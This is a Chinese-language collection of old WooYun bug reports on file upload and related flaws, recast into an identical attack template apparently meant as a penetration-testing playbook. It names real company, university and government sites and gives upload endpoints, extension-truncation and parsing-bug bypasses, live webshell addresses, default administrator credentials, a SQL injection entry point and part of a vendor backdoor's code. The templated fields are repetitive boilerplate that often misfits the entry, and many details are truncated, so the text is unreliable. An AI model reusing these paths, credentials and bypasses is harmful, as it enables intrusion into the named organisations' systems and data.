**修复**: 对上传文件进行服务端验证，只允许上传JPG,GIF,BMP文件，而且大小写全部转换成小写，对0x00，分号冒号等特殊符号进行过滤。
---

---
### [wooyun-2012-016156] 迅雷旗下数个分系统可被入侵
**厂商**: 迅雷 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1, 加多宝活动,上传图片可抓包得到文件真实路径2,使用nginx解析漏洞直接得到网站权限.PS,发现这个漏洞跟上报时间有些长,主要是中间有点忙,今天打开看到还没修复,就发上来吧.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级打补丁~
---

---
### [wooyun-2014-077145] 通易建站系统上传漏洞利用
**厂商**: 通易建站系统 | **年份**: 2014 | **类型**: 上传漏洞

**元思考**: 触发信号: 上传功能

**洞察**: 上传漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别上传漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 谷歌地址：http://gunduzi.duapp.com/关键字：美工及程序设计:金站网·通易建站漏洞上传：/UpFileForm.asp（在域名后加上）讲解下burp截断吧

**POC**: 谷歌地址：http://gunduzi.duapp.com/关键字：美工及程序设计:金站网·通易建站漏洞上传：/UpFileForm.asp（在域名后加上）讲解下burp截断吧先代理本地ipburp截断点击GO！！OK!成功拿下。。这一分钟拿成百上千的站啊。。

**绕过**: 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2014-073155] 解放军总医院海南分院集合
**厂商**: www.301hn.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.301hn.cn/manage/login.asp  admin admin目录遍历任意文件上传

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-059038] 山西电信某分站任意文件上传
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://59.49.20.242/注册之后填写简历

**POC**: ↑

**绕过**: 直接利用

**修复**: 不懂。
---

---
### [wooyun-2012-016537] Java写文件时文件名00截断 BUG
**厂商**: java | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试环境:1.windows7(x64)+tomcat7+jdk1.62.Linux3.0(ubuntu11.10)(x86)+tomcat7+jdk1.7Java在上面两种环境写文件时，会因为00截断而无法正确为新生成的文件命名。比如用户需要的用户名abc.jsp .jpg，但经过00截断后，生成的文件的名称变为abc.jsp , 因此我们在涉及到上传的文件名没更改名称或者可自定义目录的时候加以利用。测试发送的头部数据如下：POST /simpleUpload/write.jsp HTTP/1.1Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*Accept-Language: zh-cnContent-Type: application/x-www

**POC**: 1.在windows7(x64)+tomcat7+jdk1.6环境下提交的数据返回结果的截图：2.在Linux3.0(ubuntu11.10)(x86)+tomcat7+jdk1.7环境下提交的数据返回结果的截图：从上图我们可以看到：1点成功了,表示文件已经上传成功了,并且文件名abc.jsp00.jpg没变，且java认为这个文件存在的。2点也成功了，表明 abc.jps存在.3我们用abc.jsp组全00.jpg去确认这个文件是否存在，结果java认为存在。注:(这里的00表示16进制字符)当我们打开对应的目录时，发现只有abc.jsp存在。这说明文件名00截断是JAVA的原因。而不是系统

**绕过**: 截断攻击

**修复**: 加强输入验证
---

---
### [wooyun-2012-07572] 安徽省农委：一个测试账号引发的血案
**厂商**: 安徽省农委 | **年份**: 2012 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、http://oa.ahzzyw.com存在测试账号，用户名test，密码test。2、进入后在撰写邮件时，发现使用了FCK，并可上传木马。3、发现服务器上有N多网站，通过web.config可一一连接数据库进入。4、数据库有大量敏感信息，例如账号密码（大部分未加密）、身份证、资金补贴、往来邮件等等。5、最后还是值得表扬一下，数据库进行了降权，账号权限都进行了较为严格的划分控制，虽然仍然不能抵挡，但至少增加了很多障碍。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1、已发现个别站点之前有黑阔先行进入，应及时清理。2、多个系统存在测试账号和弱口令，清理。3、对上传的控制在客户端、服务端都应加强，尤其是FCK这种问题较多的程序。4、对系统内的写、执行权限严格控制。5、涉及用户密码的数据库信息应加密。
---

---
### [wooyun-2014-067795] 实战绕过360网站卫士文件上传防护
**厂商**: 奇虎360 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先制作一个asp脚本，删除任意文件的(认为删除任意文件这个能被传上去，把网站都删了，感觉这个危害巨大无比)点击上传被拦截了好牛叉呀，由经过测试已经知道，上传的内容是不会拦截的，肯定是拦截了上传的文件名。抓包js.asp被拦截了。这个时候只能上看家本领了。因为其他的土鳖方法都没有绕过去。只要删除filename前面的分号，然后发送请求，发现网站卫士不会进行拦截，原因很简单，匹配不到filename了，进而找不到我的js.asp了，因此就不拦了。这个js.asp可以删除网站任意有权限文件，危害还挺大的，对于这种其实可以绕过很多防护，以前曾跟业界大牛讨论过，可惜大牛说，这不算，这已经破坏了http的标准协议，怎么能算，我们就防护标准协议。看到这，我都无语了，无奈了，无言以对了，啥也不说了，呵呵。 其实个人认为，任何攻击只有能产生实际的攻击效果，作为防护软件就应该防护。最后以某著名白帽子stud

**POC**: 如上所示

**绕过**: 过滤绕过

**修复**: 提取特征吧最后来吐槽一下，乌云真的是很好的平台，在这里不但学习技术，最主要不用跟厂商沟通来沟通去，磨磨唧唧的...,好像谁没有100 200 会死 呵呵。吐槽完毕，回归技术
---

---
### [wooyun-2014-077395] 某门户系统管理存在任意脚本文件上传漏洞（续）
**厂商**: JAVAPMS | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 继 http://wooyun.org/bugs/wooyun-2010-053280 之后， demo.javapms.com 修复了漏洞，无法上传jspx.但修补方式只检验表单Content-Type，所以上传漏洞依然存在.

**POC**: 注册用户，修改头像处上传jspx，修改Content-Type绕过检查.用户数7K，小众

**绕过**: 直接利用

**修复**: 上传白名单限制.吐槽下：厂商只是修复demo.javapms.com ,看日期是在7月1日左右，但同服www.javapms.com 却没有修复，同时也没有发布补丁。官方最新版本 V1.3 正式版 发布时间：2014年5月26日没有责任心啊。
---

---
### [wooyun-2014-057923] eYou邮件系统文件删除(2)
**厂商**: 北京亿中邮信息技术有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 漏洞连接文件删除：/admin/group/del_addition.php文件上传：/admin/group/upload_addition.php$ToRemove = post('ToRemove');$size     = @filesize($ToRemove);if(is_array($_SESSION['tmpName'])){$key = array_search($ToRemove,$_SESSION['tmpName']);}else{$key = null;}if(file_exists($ToRemove)){$res = @unlink($ToRemove);if($res == 1){   //文件被del了if($size != false){$_SESSION['size'] -= $size;if($_SESSION['size'] < 0 ){$_

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 限制
---

---
### [wooyun-2012-07914] 腾讯某分站任意文件上传漏洞
**厂商**: 腾讯 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://young.edu.qq.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/pop1.jspncPOST https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/doUpload.jsp?picname=2012552131381371.jsp HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1GI3ei4ae0GI3Ij5Ij5ei4ae0Ij5User-Agent: Shockwave FlashHost: young.edu.qq.comContent-Length: 470Connection: Keep-AliveCache-Control

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 应该懂
---

---
### [wooyun-2011-03311] Webplus2008内容管理上传漏洞
**厂商**: 南京苏迪科技 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞页面：http://website/ids/control/htmleditor/upload.jsp

**POC**: 打开漏洞页面，点击“浏览”回车，在当前页面中查看源码，可以看到刚才上传的jsp脚本木马的名称；木马保存在http://website/ids/目录下；

**绕过**: 直接利用

**修复**: 无需多言。
---

---
### [wooyun-2012-010439] 腾讯分站一上传任意执行
**厂商**: 腾讯 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 腾讯分站一上传任意执行

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤或目录执行权限
---

---
### [wooyun-2013-018571] 泡泡淘（popotao）淘客程序官方后门
**厂商**: 泡泡淘 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在include/admin.func.php文件的最下面，发现以下代码，ZEND加密保护版权还有网站授权认证无可厚非。但是利用加密加入后门。就太可耻了。

**POC**: 9月27日的补丁版本if ( isset( $_POST['_tks'] ) && ( $tks = trim( $_POST['_tks'] ) ) ){$_tks = explode( "|", ~base64_decode( strrev( substr( $tks, 3, 5 ). substr( $tks, 8 ) . substr( $tks, 0, 3 ) ) ) );if ( trim( $_tks[1] ) == "K_".date( "Y_m_d" ) && ( strpos( $_SERVER['HTTP_HOST'], trim( $_tks[0] ) ) !== FA

**绕过**: 直接利用

**修复**: 官方恶意行为。不知道怎么修复。
---

---
### [wooyun-2012-010466] 随手记任意文件上传
**厂商**: 金蝶 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随手记任意文件上传听说随手借钱挺好使，注册了个号准备买个会员先试试传头像的时候先发现可以选择全部文件，选了个qq.exe点上传，右下角流量动了下，提示：格式不正确，开firebug，再上传，返回了文件路径。。。。http://money.feidee.com/u06https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/icon/ + 相对路径

**POC**: http://money.feidee.com/u06https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/icon/001/500/594/143/1343828771211.jsp

**绕过**: 直接利用

**修复**: 。。。选择时，限制文件类型上传时，限制文件类型上传后，判断文件是否为图片文件。。。
---

---
### [wooyun-2011-03345] phpweb解析不当加上传漏洞
**厂商**: phpweb | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <input type="hidden" name="filepath" value="Account/adminindex/1.asp;"><input type="hidden" name="filelx" value="jpg">可以解析图片马

**POC**: exp  上传shell.php.jpg<form name=”uploadForm” style=”margin:0;padding:0;” method=”post” enctype=”multipart/form-data” action=”http://xxxxx.com/maq/upload.php”><input type=”hidden” name=”fileName” id=”fileName” value=”shell.php;.jpg” /><input type=”hidden” name=”attachPath” id=”fileName” value=”maq/pic

**绕过**: 直接利用

**修复**: 过滤，对上传类型进行限制，并随机重命名上传文件
---

---
### [wooyun-2015-0160986] 南京大学某分站上传漏洞
**厂商**: nju.edu.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://xlzx.nju.edu.cn/  南京大学心理健康教育与研究中心，用的心海心理管理系统，文件上传漏洞未修复http://xlzx.nju.edu.cn/inc/upload.asp?fl=1.asp;1  上传地址上传jpg格式的asp木马利用解析漏洞，菜刀连接大量提权补丁未补上

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2015-090099] 哈药集团上传任意文件漏洞
**厂商**: 哈药集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 内容很简单，就是一个上传。

**POC**: 首先上传文件地址：http://hayao.com/home_registration.aspx路径是这个，上传文件会判断后缀，仅仅是后缀。。。普通的webshell传了几个 发现失败了。后来想到了.NET 文件包含。然后做了一个文件包含的webshell.两个文件，第一个文件 是shell内容. 另外加了图片的文件头.进行提交后，记录上传的图片路径，http://hayao.com/UploadFile/201515/EJ2I8RC201515.jpg看起来只是一个图片而已。。。然后进行第二步，传输调用页面。前面说了，它只验证后缀.jpg (我只是测试了.jpg， 其他没有了。。)都说了是文

**绕过**: 直接利用

**修复**: 1.先把上传的逻辑修改掉吧！2.检测服务器 D:\hyjt\UploadFile\ 所有文件中的所有可能存在的后门，建议使用D盾WEBshell查杀工具，可以吧以前 “黑阔们”留下的shell 全部找出来然后灭掉。3.修改你的SQLserver 账号和密码。 创建低权限用户等。
---

---
### [wooyun-2014-078843] 滁州市知识产权局
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCK上传漏洞，服务器配置不严，导致同站全部被Rczsipo.gov.cn

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2015-0113463] 中国航天科技集团公司某漏洞
**厂商**: 中国航天科技集团公司 | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 撞裤http://anbn.spacechina.com/admin/被挂菠菜alt.spacechina.com/guoji/856/185/066/calt.spacechina.com/news/774/index.htmlcalt.spacechina.com/news/list_13.html上传漏洞http://anbn.spacechina.com/include/uploadAttr.jsp?file_type=1&root_id=3s6260274wkC717抓包改包即可四川航天研究院 注入http://scaat.spacechina.com/picnew.asp?id=719直接sa 。可执行系统命令。

**POC**: http://anbn.spacechina.com/include/uploadAttr.jsp?file_type=1&root_id=3s6260274wkC717抓包改包即可四川航天研究院 注入http://scaat.spacechina.com/picnew.asp?id=719直接sa 。可执行系统命令。

**绕过**: 直接利用

**修复**: 请重视安全问题。全面检查！
---

---
### [wooyun-2014-086316] 某省移动主站可被入侵
**厂商**: 中国移动 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客服导致

**POC**: 域名：js.10086.cn 存在任意文件上传（中国移动网上在线客服，图片处）------------详情--------http://www.js.10086.cn/iRobot/index.jsp?type=1开启burp抓包，研究了下/iRobot/page/common/fileimg.jsp?flag=success&&suffix=c:\xxxx是干嘛的？？  修改成jsp试试。。。。POST /iRobot/page/common/fileimg.jsp?flag=success&&suffix=jsp HTTP/1.1Host: www.js.10086.cnProxy-Con

**绕过**: 直接利用

**修复**: http://www.js.10086.cn/iRobot/pic/20141111/13401462424/2014111116384141.jsphttp://js.10086.cn/iRobot/pic/20141012/15751540161/20141012194410263.jsp?cm
---

---
### [wooyun-2014-062783] 兰州大学信息学院官网越权操作
**厂商**: 兰州大学 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考漏洞：http://wooyun.org/bugs/wooyun-2010-02750ZCMS版本太低导致。除此之外，ZCMS在编辑文章的附件上传中没有做类型限制，仅仅是添加了“自定义类型”。而其在文件管理中做了限制，这就很费解。这是不是一个通用性问题？回来测试下吧。PS：看日志已经有人上传过jsp大马了。从IP来看是本校校园网用户，IP段应该是榆中校区学生宿舍。

**POC**: http://xxxy.lzu.edu.cn/zcms/SSO.jsp?u=admin&t=1&s=ff1168b33fe9e33841bb9814c58a098d

**绕过**: 直接利用

**修复**: 升级一下吧
---

---
### [wooyun-2014-074397] 轻松绕过七牛身份验证上传限制的后缀文件（理论可上传任何文件）
**厂商**: 七牛云存储 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 上传功能

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，你要有一个七牛账号注册好了之后，你就是体验用户了新建一个空间目前已知.css后缀文件，体验用户是不能上传的（寻找本地文件的时候，屏蔽.css去了，只能自己输入文件名，点确定）七牛太狡猾了，寻找本地文件的时候，屏蔽.css，上传之前还判断一次！最近什么都流行“一键”注册一个tk，把“非法文件”放上去什么，你不知道tk是免费的吗?给我99wb，我教你注册！访问七牛子域名加载成功了那么，我们的“非法文件”也就上传成功了PS，我tk的那个空间里面有css，所以我就直接用空间上面的css了，而不是本地桌面上的css，所以大小不一样顺便再做一个exe格式的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们上传都 懂 设置了后缀判断，难道一键加速网站，缓存到CDN上，再判断一次页不难吧对了，记得你们上次宕机的时候，一客服说送我100元代金券到现在还没到账！！~~~~(>_<)~~~~求Rank求礼物！
---

---
### [wooyun-2012-014548] 猪八2级域名可被入侵
**厂商**: 猪八戒网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站出现被入侵！·

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不详
---

---
### [wooyun-2015-091392] 易车网某分站存在任意文件上传漏洞
**厂商**: 易车 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 易车网某分站存在任意文件上传漏洞

**POC**: 易车网某分站存在任意文件上传漏洞在进行找后台的时候发现这个地址admin.bitauto.com很奇葩于是进行 搜索发现上传地址http://admin.bitauto.com/support/pluginpage/flashUpload/FlashUpload.aspx

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-025551] 织梦漏洞秒杀某导航网站
**厂商**: hao360网站导航 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 升级时间显示可利用漏洞太多，会员注册页面，留言评论等。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 大哥,你懂的！
---

---
### [wooyun-2014-049309] 优客居主站任意文件上传
**厂商**: 优客居 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在用户头像上传那里未过滤，导致任意文件上传。http://www.xmb.com.cn/

**POC**: 新建

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020509] 腾讯某儿童分站文件上传漏洞
**厂商**: 腾讯 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://fun.kid.qq.com/进入个人中心有一个头像上传处可以传危险文件例如JSP 但是不能够执行但是一部分后缀名应该过滤了吧。。

**POC**: http://data1.class.qq.com/funshow/2013-03-23/s_13639714627850.jsp

**绕过**: 直接利用

**修复**: 过滤下上传后缀名吧
---

---
### [wooyun-2014-075433] 亲亲网上传漏洞危害很大
**厂商**: 亲亲网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传漏洞用 这个上传改后缀PHP

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我不会修复 你们技术应该会
---

---
### [wooyun-2014-047940] 江苏福彩服务器目测已被入侵
**厂商**: jslottery.com | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个被人上传的木马http://www.jslottery.com/manage/fckeditor/editor/skins/default/images/toolbar.end.asp;1_2.gif被人安装了Easy File Lockerc:\windows\下有C:\WINDOWS\xlkfs.dat

**POC**: http://www.jslottery.com/manage/fckeditor/editor/skins/default/images/toolbar.end.asp;1_2.gif被人安装了Easy File Lockerc:\windows\下有C:\WINDOWS\xlkfs.dat

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2014-070049] 浙江在线某前台任意文件上传之诸多分站侧漏
**厂商**: zjol.com.cn | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 图上都是一些证明 不止图上那些，不过之前的那个漏洞送啥礼物啊 到底还送不送啊。那这个漏洞能有礼物吗？ 乌云哥能不能别扣我乌云b。我穷

**绕过**: 直接利用

**修复**: 我是小巫，你是大巫！
---

---
### [wooyun-2012-06296] 大洋网某日报网站存在重大漏洞
**厂商**: 大洋网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://gzdaily.dayoo.com/bison/commons/FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/jsp/connectorFckeditor编辑器文件上传没有过滤，直接可以上传jsp文件。

**POC**: Fckeditor编辑器文件上传没过滤，直接获取webshell；网站目录；网站服务器ip地址，是内网地址喔！！！root权限，可以查看/etc/shadow文件。

**绕过**: 直接利用

**修复**: 限制上传文件类型，隐蔽编辑器目录路径，最好能适当降低权限，root权限伤不起啊！！！
---

---
### [wooyun-2014-072251] 某直辖市家校沟通平台文件上传（可无限发送任意短信）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 服务器找到的，大概就是这破系统。地址：http://jxt.cqedu.net/       （cqedu，沙坪坝是重庆教育区）管理员账户：admin  密码：.admin.   （注意哦有标点）#正题登录一个普通账号，在-教师办公-内部邮箱-附件选择附件选择一个aspx木马文件，选择一个发信人(可以选自己(┬＿┬))于是自己给自己发一条信息，然后去新信箱查看下载附件就知道木马地址：http://jxt.cqedu.net/TeachPhoto/2012015/FJ7.aspx

**POC**: 家校互动下有短信功能，试了下：菜刀：http://jxt.cqedu.net/TeachPhoto/2012015/FJ3.aspx        pass怀疑是学校计算机老师作案，老是收到诈骗升学广告短信等。

**绕过**: 直接利用

**修复**: 我绝对没碰这些信息，还有就是现在信息泄漏太猖獗了。
---

---
### [wooyun-2013-026754] 四川省国家税务局某网站任意文件上传漏洞
**厂商**: 四川省国家税务局 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 四川省国家税务局网站(www.sc-n-tax.gov.cn)的网站程序集成了较低版本的FCKeditor编辑器，可以跨目录读取文件，上传任意类型文件等。http://www.sc-n-tax.gov.cn/TaxWeb/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&CurrentFolder=/../../&Type=File

**POC**: 上传JSP脚本获取webshell:

**绕过**: 直接利用

**修复**: 集成到网站应用中的FCK编辑可能是从原版修改过来的，简单地升级替换可能导致网站出现问题，我觉得还是找开发厂家解决靠谱吧。
---

---
### [wooyun-2015-0100958] 达闻传媒某分站任意上传可导致服务器沦陷
**厂商**: dawenmedia.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天看wooyun发现新来的厂商就谷歌了一下。发现一处上传：http://wx.api.dawenmedia.com/wxdw/register/bride然后尝试上传上传截图数据如下：POST /wxdwhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/save HTTP/1.1Host: wx.api.dawenmedia.comProxy-Connection: keep-aliveContent-Length: 195Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://wx.api.dawenmedia.comUser-Agent: Mo

**POC**: (见原文)

**绕过**: 直接利用

**修复**: *
---

---
### [wooyun-2013-034994] 华中师范大学武汉传媒学院弱口令以及任意上传漏洞
**厂商**: 华中师范大学 | **年份**: 2013 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 后台管理

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度搜索得到后台管理地址：www.whmc.edu.cn/jl_admin/使用弱口令字典可以得到用户名：administrator密码：123456

**POC**: 另外可以上传任意文件。

**绕过**: 直接利用

**修复**: 加强帐号管理，上传页面进行过滤
---

---
### [wooyun-2013-019278] 凤凰网上传漏洞
**厂商**: 凤凰网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我专业
---

---
### [wooyun-2015-098169] IDL-EDT30学位论文管理系统任意文件上传两处
**厂商**: 国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

